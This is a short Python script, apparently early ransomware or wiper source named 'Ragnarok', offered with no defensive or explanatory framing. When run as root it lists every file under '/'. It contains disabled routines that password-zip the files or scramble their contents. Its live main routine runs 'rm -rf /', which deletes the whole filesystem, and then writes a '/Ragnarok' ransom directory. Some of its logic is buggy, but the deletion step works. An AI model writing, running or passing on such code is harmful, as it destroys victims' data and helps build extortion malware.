import os
import sys
import subprocess
self = sys.argv[0]
num = (len(self) - 1) - 7
selfPath = self[:num]
origin = "/" #This will set the highest directory with which to lock down
def main():
    fileList = findFiles(origin)
    #zipLock(fileList)
    #randLock(fileList)
    
    os.system("rm -rf " + origin)
    os.system("mkdir /Ragnarok")
    os.system("touch /Ragnarok/directory")
    os.system('echo "' + origin + '" >> /Ragnarok/directory')
    os.system("mv " + selfPath + "Ragnarok.zip /Ragnarok/zip.zip")
    
def randLock(fileList):
    for file in fileList:
        command = "cat " + file
        fileCont = str(subprocess.check_output(command, shell=True))
        num = len(fileCont)/2
        firstStr = fileCont[:num]
        secondStr = fileCont[num:]
        newCont = secondStr + firstStr
        os.system('echo "' + newCont + '" > ' + file)
def zipLock(fileList):
    command = "zip -e Ragnarok.zip "
    for file in fileList:
        command = command + file + " "
    os.system(command)
def findFiles(origin):
    excludedFiles = [self, "/bin/cat", "/bin/echo"]
    fileList = []
    for root, dirs, files in os.walk(origin):
        for file in files:
            if(file not in excludedFiles):
                path = os.path.join(root, file)
                fileList.append(path)
    return fileList
if(os.getuid() == 0):
    main()